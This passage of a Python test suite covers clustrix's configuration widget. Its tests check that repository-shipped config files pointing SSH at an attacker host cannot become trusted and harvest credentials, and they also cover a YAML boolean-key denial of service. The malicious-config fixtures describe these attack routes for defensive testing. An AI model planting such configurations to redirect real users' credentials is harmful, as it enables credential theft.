        widget.config_dropdown.value = "SSH Remote Server"
        widget.host_field.value = os.environ["CLUSTRIX_TEST_HOST"]
        widget.port_field.value = int(os.environ["CLUSTRIX_TEST_PORT"])
        widget.username_field.value = "victim"
        widget._on_add_config(None)
        widget.save_filename_input.value = "config.yml"
        widget._on_save_config(None)
        print(json.dumps({"source_map": dict(widget.config_source_map)}))
    """
    first = _session(
        build_it,
        home,
        workdir,
        {
            "CLUSTRIX_TEST_HOST": attacker_server.host,
            "CLUSTRIX_TEST_PORT": str(attacker_server.port),
        },
    )
    assert first["source_map"] == {}, "a configuration the user typed was discovered"
    written = (home / ".clustrix" / "config.yml").read_text(encoding="utf-8")
    assert "config_sources" not in written, (
        "a configuration nobody discovered was recorded as though it had "
        "been: " + written
    )

    use_it = _ROUTE_12_SESSION_TWO.replace(
        "widget._on_apply_config(None)",
        'widget.config_name.value = ""\n    widget._on_apply_config(None)',
    )
    second = _session(
        use_it, home, elsewhere, {"CLUSTRIX_TEST_PICK": "New Configuration"}
    )
    assert second["source_map"] == {"New Configuration": CONFIG_SOURCE_USER_CONFIG_DIR}
    assert second["applied"]["trusted"] is True
    assert second["authenticated"], (
        "a configuration the user built and saved themselves stopped working "
        "after a restart"
    )
    assert attacker_server.authentications == [("victim", "password")]


def test_the_record_is_not_offered_as_a_configuration(tmp_path, monkeypatch):
    """``config_sources`` is clustrix's record, never an entry in the dropdown.

    ``_initialize_configs`` walks a file's top-level keys as configuration
    names. Leaving the record in would put a configuration called
    ``config_sources`` in the dropdown, whose "cluster_host" is a source
    name -- and, worse, would hand ``recorded_config_source`` a mapping it
    had already been read out of.
    """
    pytest.importorskip("ipywidgets")
    from clustrix.notebook_magic_config import CONFIG_SOURCES_KEY

    repo = tmp_path / "cloned-repository"
    repo.mkdir()
    (repo / "config.yml").write_text(
        "\n".join(
            [
                "shipped:",
                "  cluster_type: ssh",
                f"  cluster_host: {UNRELATED_ATTACKER_HOST}",
                "  username: victim",
                f"{CONFIG_SOURCES_KEY}:",
                "  shipped: working-directory",
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(repo)

    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    assert CONFIG_SOURCES_KEY not in widget.configs
    assert CONFIG_SOURCES_KEY not in widget.config_dropdown.options
    assert "shipped" in widget.configs


#: What ``_on_save_config`` turns a configuration ``name`` into, and whether
#: ``detect_config_files`` then looks for the result. The attacker chooses
#: the ``name`` in the file it ships, so this table is the precondition for
#: route 12 and it is attacker-controlled.
@pytest.mark.parametrize(
    "configured_name,filename,promotes",
    [
        ("", "config.yml", True),
        ("Config", "config.yml", True),
        ("clustrix", "clustrix.yml", True),
        ("My Cluster", "my_cluster.yml", False),
    ],
)
def test_which_configuration_names_save_to_a_discovered_filename(
    configured_name, filename, promotes
):
    """The names that promote are the ones ``detect_config_files`` looks for.

    Both halves are computed from the shipped code rather than restated, so
    a change to either the filename rule or the search list shows up here.
    """
    from clustrix.notebook_magic_config import detect_config_files

    safe_name = (configured_name or "config").replace(" ", "_").lower()
    assert f"{safe_name}.yml" == filename

    directory = get_config_dir()
    directory.mkdir(mode=0o700, parents=True, exist_ok=True)
    written = directory / filename
    written.write_text("cluster_type: local\n", encoding="utf-8")
    try:
        found = detect_config_files([str(directory)])
    finally:
        written.unlink()
    assert (written in found) is promotes


def test_carrying_no_provenance_clears_what_the_name_already_had(tmp_path, monkeypatch):
    """Kills: dropping the ``else`` in ``_carry_config_provenance``.

    Defensive today -- ``_on_add_config`` invents a name nothing else holds,
    and the family test forbids an orphaned sidecar, so the clearing branch
    is not reachable from any door. It is pinned anyway, because it is half
    of the both-directions rule ``_rename_config_metadata`` states and
    relies on, and because "not reachable today" is what routes 11 and 12
    were before somebody found the door.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget.config_source_map["borrowed"] = CONFIG_SOURCE_WORKING_DIRECTORY
    widget.config_source_host_map["borrowed"] = UNRELATED_ATTACKER_HOST

    widget._carry_config_provenance(
        "borrowed", None, {"cluster_host": "my-own-cluster.example"}
    )

    assert "borrowed" not in widget.config_source_map
    assert "borrowed" not in widget.config_source_host_map


def test_copying_a_found_configuration_does_not_claim_its_file(tmp_path, monkeypatch):
    """Kills: carrying ``config_file_map`` from the source name in "+".

    The reason it stays behind is a fact about the copy -- no file holds it
    -- and not the category the earlier justification claimed, that the map
    "decides which entries a save writes back, not who may receive a
    credential". Route 12 falsifies that: what a save writes, and under what
    name, is a credential decision one restart later.

    The entry would be inert today, because the only thing ``config_file_map``
    decides is whether an unmodified ``DEFAULT_CONFIGS`` entry is written
    back, and the names "+" generates can never be one. That inertness is
    asserted here too rather than assumed, since it is the whole of why this
    is a pin and not a leak.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    assert set(widget.config_file_map) == {"config"}

    widget._on_add_config(None)

    assert widget.current_config_name == "New Configuration"
    assert set(widget.config_file_map) == {"config"}, (
        "the copy claimed the file the configuration it was copied from " "lives in"
    )
    from clustrix.notebook_magic_config import DEFAULT_CONFIGS

    generated = {"New Configuration"} | {
        f"New Configuration {counter}" for counter in range(1, 50)
    }
    assert generated.isdisjoint(DEFAULT_CONFIGS), (
        "a generated name can now collide with a default, so the excluded "
        "entry would no longer be inert"
    )


def test_pasting_a_document_whose_first_entry_is_not_a_configuration(
    tmp_path, monkeypatch
):
    """Kills: selecting the first key of the document rather than the first
    configuration in it.

    A pasted document may begin with something that is not a configuration
    -- a comment key, a version marker, a typo. Selecting it left
    ``current_config_name`` naming something that was never put in
    ``self.configs``; ``_load_config_to_widgets`` returns early on a name it
    does not know, so nothing corrected it until ``_update_config_dropdown``
    happened to select something else. Unguarded rather than leaking, and a
    name disagreeing with the thing keyed by it is the shape of every leak
    in this file.
    """
    pytest.importorskip("ipywidgets")
    _repository_config_naming(UNRELATED_ATTACKER_HOST, tmp_path, monkeypatch)

    widget = _clusterfy_widget()
    widget.load_config_text.value = "\n".join(
        [
            "notes: pasted from the project README",
            "project:",
            "  cluster_type: ssh",
            "  cluster_host: my-own-cluster.example",
            "  username: me",
        ]
    )
    widget._on_load_config(None)

    assert widget.current_config_name == "project"
    assert widget.current_config_name in widget.configs
    assert "notes" not in widget.configs


def test_a_single_configuration_file_is_read_under_its_own_record_too(
    tmp_path, monkeypatch
):
    """Kills: honouring the record only in the multi-configuration shape.

    Save never writes a flat file carrying a record -- there is nowhere to
    put a sibling key without it becoming a configuration field, so a save
    with something to record uses the nested shape. A flat file carrying one
    can therefore only have been written by a human, marking a configuration
    they know is not theirs.

    Ignoring it in that shape would only ever err towards *more* trust,
    which is the wrong direction and the one this whole file is about, so
    both shapes read the record under the same rule.
    """
    pytest.importorskip("ipywidgets")
    from clustrix.notebook_magic_config import CONFIG_SOURCES_KEY

    directory = get_config_dir()
    directory.mkdir(mode=0o700, parents=True, exist_ok=True)
    (directory / "config.yml").write_text(
        "\n".join(
            [
                "cluster_type: ssh",
                f"cluster_host: {UNRELATED_ATTACKER_HOST}",
                "username: victim",
                f"{CONFIG_SOURCES_KEY}:",
                f"  config: {CONFIG_SOURCE_WORKING_DIRECTORY}",
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(tmp_path)

    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()

    assert widget.config_source_map == {"config": CONFIG_SOURCE_WORKING_DIRECTORY}
    assert CONFIG_SOURCES_KEY not in widget.configs["config"]
    widget.config_dropdown.value = "config"
    assert widget._discovered_source_for(_live_widget_fields(widget)) == (
        CONFIG_SOURCE_WORKING_DIRECTORY
    )


def test_a_save_with_something_to_record_never_writes_the_flat_shape(tmp_path):
    """Kills: recording into the flat shape instead of nesting first.

    The flat shape has no sibling namespace, so the record would have to be
    keyed by something the reader can find -- and the reader of a flat file
    names the configuration after the *filename stem*, which is not the name
    the widget holds. ``Config`` saved as ``config.yml`` is exactly that
    mismatch, and a record the reader looks up under the wrong key is no
    record at all.
    """
    pytest.importorskip("ipywidgets")
    from clustrix.notebook_magic_config import CONFIG_SOURCES_KEY
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    widget.config_name.value = "Config"
    widget.cluster_type.value = "ssh"
    widget.host_field.value = UNRELATED_ATTACKER_HOST
    widget.username_field.value = "victim"
    widget.current_config_name = "Config"
    widget.configs = {"Config": widget._save_config_from_widgets()}
    widget.config_source_map["Config"] = CONFIG_SOURCE_WORKING_DIRECTORY
    widget.config_source_host_map["Config"] = UNRELATED_ATTACKER_HOST

    widget._on_save_config(None)

    import yaml

    written = yaml.safe_load(
        (get_config_dir() / "config.yml").read_text(encoding="utf-8")
    )
    assert written[CONFIG_SOURCES_KEY] == {"Config": CONFIG_SOURCE_WORKING_DIRECTORY}
    assert "cluster_type" not in written, (
        "the flat shape was written, so the record is keyed by a name the "
        "reader will never look up: " + repr(sorted(written))
    )
    assert written["Config"]["cluster_host"] == UNRELATED_ATTACKER_HOST


# --------------------------------------------------------------------------
# Round 17. Three things the route-12 fix left behind.
#
# 1. A denial of service the fix itself introduced. ``sorted(names)`` over
#    configuration names assumes every name is a string, and a YAML key is
#    not always one: YAML 1.1 resolves ``on:``, ``off:``, ``yes:``, ``no:``
#    to booleans, ``null:`` to ``None`` and ``2:`` to an int. A cloned
#    repository shipping such a key made Save fail outright -- and, with a
#    second custom entry beside it, made the widget fail at construction,
#    which it already did before the fix. Fixed once, at the boundary where
#    document keys become names (``config_name_from_document``), rather than
#    by teaching each ``sorted()`` call to tolerate mixed types.
#
# 2. The write filter's invariant -- the key never carries a *trusted*
#    source -- was documented and unpinned. Recording trusted sources too
#    passed the whole suite while writing exactly the claim the read side
#    exists to disbelieve.
#
# 3. The write side keyed off ``config_source_map`` where Apply keys off
#    ``_discovered_source_for``, so typing your own hostname over a found
#    configuration applied as ``runtime`` in the session and came back
#    ``working-directory`` in the next one. It erred safe, so it was a wrong
#    answer rather than a leak, and it is now the same rule on both sides.
# --------------------------------------------------------------------------


#: A name only YAML 1.1 could produce. ``on`` is the boolean true, so the
#: mapping key is ``True`` and not the four characters the user typed.
_BOOL_KEYED_REPOSITORY_CONFIG = """\
on:
  cluster_type: ssh
  cluster_host: %s
  username: victim
project:
  cluster_type: ssh
  cluster_host: %s
  username: victim
""" % (
    UNRELATED_ATTACKER_HOST,
    UNRELATED_ATTACKER_HOST,
)


#: Open the widget and press Save. Nothing here is about trust: the question
#: is only whether a shipped file can stop either from working at all.
_ROUND_17_DOS_SESSION = """
    import contextlib, io, json
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    widget.save_filename_input.value = "config.yml"
    captured = io.StringIO()
    with contextlib.redirect_stdout(captured):
        widget._on_save_config(None)
    print(json.dumps({
        "names": sorted(repr(name) for name in widget.configs),
        "every_name_is_a_string": all(
            isinstance(name, str) for name in widget.configs
        ),
        "save_output": captured.getvalue().strip().splitlines()[-1:],
    }))
"""


def test_a_configuration_file_yaml_did_not_key_with_strings_still_works(tmp_path):
    """A shipped ``on:`` must not be able to break the widget or Save.

    RED before ``config_name_from_document``: constructing the widget raised
    ``TypeError: '<' not supported between instances of 'str' and 'bool'``
    from ``_rebuild_config_dropdown``, and with a single such entry it got
    as far as Save and printed
    ``Error saving configuration: '<' not supported ...`` instead.

    It fails closed, so nothing leaks -- but a repository being able to stop
    a user saving the configuration they just edited is an
    attacker-controlled denial of service, and this one arrived with the
    route-12 fix.
    """
    home = _route_12_home(tmp_path)
    repository = tmp_path / "cloned-repository"
    repository.mkdir()
    (repository / "config.yml").write_text(
        _BOOL_KEYED_REPOSITORY_CONFIG, encoding="utf-8"
    )

    result = _session(_ROUND_17_DOS_SESSION, home, repository)

    assert result["every_name_is_a_string"], result["names"]
    assert "'True'" in result["names"], result["names"]
    assert result["save_output"] == [
        "✅ Configuration saved to: %s" % (home / ".clustrix" / "config.yml")
    ], result["save_output"]


#: Session one: the repository's ``on:`` entry is saved into ~/.clustrix.
_ROUND_17_COERCED_NAME_SAVE = """
    import json
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    widget.config_dropdown.value = widget.config_dropdown.options[-1]
    widget.save_filename_input.value = "config.yml"
    widget._on_save_config(None)
    print(json.dumps({
        "selected": repr(widget.current_config_name),
        "source_map": {repr(k): v for k, v in widget.config_source_map.items()},
    }))
"""

#: Session two: a fresh widget elsewhere reads the file back.
_ROUND_17_COERCED_NAME_READ = """
    import json
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    print(json.dumps({
        "source_map": {repr(k): v for k, v in widget.config_source_map.items()},
        "hosts": {
            repr(k): v.get("cluster_host")
            for k, v in widget.configs.items()
            if isinstance(v, dict)
        },
    }))
"""


def test_a_name_yaml_read_as_a_bool_still_carries_its_provenance(tmp_path):
    """The coercion must not lose the record, which is keyed by the name.

    Two real interpreters with their own ``$HOME``; the only channel between
    them is the file Save wrote. The record is written under the coerced
    name and looked up under the coerced name, because a record that is not
    found reads as *absence*, and absence is deliberately trusted.
    """
    home = _route_12_home(tmp_path)
    repository = tmp_path / "cloned-repository"
    repository.mkdir()
    (repository / "config.yml").write_text(
        "on:\n"
        "  cluster_type: ssh\n"
        f"  cluster_host: {UNRELATED_ATTACKER_HOST}\n"
        "  username: victim\n",
        encoding="utf-8",
    )

    first = _session(_ROUND_17_COERCED_NAME_SAVE, home, repository)
    assert first["source_map"] == {"'True'": CONFIG_SOURCE_WORKING_DIRECTORY}

    import yaml

    written = yaml.safe_load(
        (home / ".clustrix" / "config.yml").read_text(encoding="utf-8")
    )
    assert written[CONFIG_SOURCES_KEY] == {"True": CONFIG_SOURCE_WORKING_DIRECTORY}

    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    second = _session(_ROUND_17_COERCED_NAME_READ, home, elsewhere)
    assert second["hosts"]["'True'"] == UNRELATED_ATTACKER_HOST
    assert second["source_map"] == {"'True'": CONFIG_SOURCE_WORKING_DIRECTORY}, (
        "the file moved into ~/.clustrix and the record that says otherwise "
        "was not found under the name the configuration ended up with"
    )


def test_a_save_never_records_a_source_the_read_side_would_ignore(
    tmp_path, monkeypatch
):
    """Kills M9: recording trusted sources as well as untrusted ones.

    ``if name in self.config_source_map`` in place of the untrusted filter
    passed all 121 route-12 tests while writing
    ``config_sources: {Config: user-config-dir}`` -- a *trusted* claim, in a
    file, which is the one thing the key must never carry. The read side
    ignores it (:func:`config_source_for_saved_entry` only ever downgrades),
    so nothing leaked; the invariant the docstring states was simply never
    asserted, and a written claim of trust is one refactor away from being
    believed.
    """
    pytest.importorskip("ipywidgets")
    import yaml

    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    # ``detect_config_files`` searches ``.`` as well, and the checkout this
    # suite runs from has a ``clustrix.yml`` in it, so the working directory
    # has to be one with nothing in it for the assertion to be about the
    # file this test wrote.
    monkeypatch.chdir(tmp_path)

    # A file in the user's own configuration directory: trusted, and the
    # only shape in which a *trusted* source reaches config_source_map.
    config_dir = get_config_dir()
    config_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
    (config_dir / "config.yml").write_text(
        "Mine:\n"
        "  cluster_type: ssh\n"
        "  cluster_host: my-own-cluster.invalid\n"
        "  username: me\n",
        encoding="utf-8",
    )

    widget = EnhancedClusterConfigWidget()
    assert widget.config_source_map["Mine"] == CONFIG_SOURCE_USER_CONFIG_DIR
    widget.config_dropdown.value = "Mine"
    widget.save_filename_input.value = "config.yml"
    widget._on_save_config(None)

    written = yaml.safe_load((config_dir / "config.yml").read_text(encoding="utf-8"))
    assert CONFIG_SOURCES_KEY not in written, (
        "a trusted source was written into the file; the read side would "
        "ignore it, but the key that only ever downgrades must not carry an "
        "upgrade at all: " + repr(written.get(CONFIG_SOURCES_KEY))
    )
    assert written["Mine"]["cluster_host"] == "my-own-cluster.invalid"


#: Session one: select the configuration the repository ships, type your own
#: hostname over it, apply, and save.
_ROUND_17_RETYPED_HOST_SAVE = """
    import json
    from clustrix.config import (
        config_source_is_trusted,
        get_config,
        get_config_source,
    )
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    widget.config_dropdown.value = "Config"
    widget.host_field.value = "my-own-cluster.invalid"
    # _save_config_from_widgets emits ``name`` and configure() rejects it,
    # so an empty name is the only state in which Apply applies anything at
    # all. Issue #165, and the route-12 sessions above work around it the
    # same way.
    widget.config_name.value = ""
    widget._on_apply_config(None)
    applied = {
        "host": get_config().cluster_host,
        "source": get_config_source(get_config()),
        "trusted": config_source_is_trusted(get_config()),
    }
    widget.save_filename_input.value = "config.yml"
    widget._on_save_config(None)
    print(json.dumps({"applied": applied}))
"""

#: Session two: a fresh widget elsewhere, asked the same question.
_ROUND_17_RETYPED_HOST_READ = """
    import json
    from clustrix.config import (
        config_source_is_trusted,
        get_config,
        get_config_source,
    )
    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    widget = EnhancedClusterConfigWidget()
    widget.config_dropdown.value = "Config"
    widget.config_name.value = ""  # issue #165, as above
    widget._on_apply_config(None)
    print(json.dumps({
        "source_map": dict(widget.config_source_map),
        "host": get_config().cluster_host,
        "source": get_config_source(get_config()),
        "trusted": config_source_is_trusted(get_config()),
    }))
"""


def test_typing_your_own_host_over_a_found_configuration_survives_a_restart(tmp_path):
    """The write side must condemn only a host the file actually named.

    RED before this: session one applied ``runtime``/trusted -- correct, and
    what ``_discovered_source_for`` has said since the false-refusal work --
    while Save wrote ``config_sources: {Config: working-directory}`` from
    ``config_source_map``, so session two read the user's *own* hostname
    back as untrusted. It errs safe, which is why it is a wrong answer
    rather than a leak; the two sides now apply the same rule.
    """
    home = _route_12_home(tmp_path)
    repository = tmp_path / "cloned-repository"
    repository.mkdir()
    (repository / "config.yml").write_text(
        "Config:\n"
        "  cluster_type: ssh\n"
        f"  cluster_host: {UNRELATED_ATTACKER_HOST}\n"
        "  username: victim\n",
        encoding="utf-8",
    )

    first = _session(_ROUND_17_RETYPED_HOST_SAVE, home, repository)
    assert first["applied"] == {
        "host": "my-own-cluster.invalid",
        "source": CONFIG_SOURCE_RUNTIME,
        "trusted": True,
    }

    import yaml

    written = yaml.safe_load(
        (home / ".clustrix" / "config.yml").read_text(encoding="utf-8")
    )
    assert CONFIG_SOURCES_KEY not in written, (
        "the file no longer names the attacker's host, so there is nothing "
        "for the record to condemn: " + repr(written.get(CONFIG_SOURCES_KEY))
    )

    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    second = _session(_ROUND_17_RETYPED_HOST_READ, home, elsewhere)
    assert second["host"] == "my-own-cluster.invalid"
    assert second["source_map"] == {"Config": CONFIG_SOURCE_USER_CONFIG_DIR}
    assert second["source"] == CONFIG_SOURCE_USER_CONFIG_DIR
    assert second["trusted"] is True


def test_the_entry_that_rode_along_is_still_condemned_after_the_host_edit(
    tmp_path, monkeypatch
):
    """The relaxation is per entry, so route 12 stays closed beside it.

    A save writes every configuration in the dropdown. Editing the host of
    the one you selected says nothing about the one you never looked at, and
    that one must still record where it came from.
    """
    pytest.importorskip("ipywidgets")
    import yaml

    from clustrix.notebook_magic_widget import EnhancedClusterConfigWidget

    monkeypatch.chdir(tmp_path)
    widget = EnhancedClusterConfigWidget()
    widget.configs["Config"] = {
        "cluster_type": "ssh",
        "cluster_host": UNRELATED_ATTACKER_HOST,
        "username": "victim",
        "name": "Config",
    }
    widget.configs["rode along"] = dict(widget.configs["Config"], name="rode along")
    for name in ("Config", "rode along"):
        widget.config_source_map[name] = CONFIG_SOURCE_WORKING_DIRECTORY
        widget.config_source_host_map[name] = UNRELATED_ATTACKER_HOST
    widget._update_config_dropdown()
    widget.config_dropdown.value = "Config"
    widget.host_field.value = "my-own-cluster.invalid"
    widget.save_filename_input.value = "config.yml"
    widget._on_save_config(None)

    written = yaml.safe_load(
        (get_config_dir() / "config.yml").read_text(encoding="utf-8")
    )
    assert written[CONFIG_SOURCES_KEY] == {
        "rode along": CONFIG_SOURCE_WORKING_DIRECTORY
    }, written[CONFIG_SOURCES_KEY]
    assert written["Config"]["cluster_host"] == "my-own-cluster.invalid"
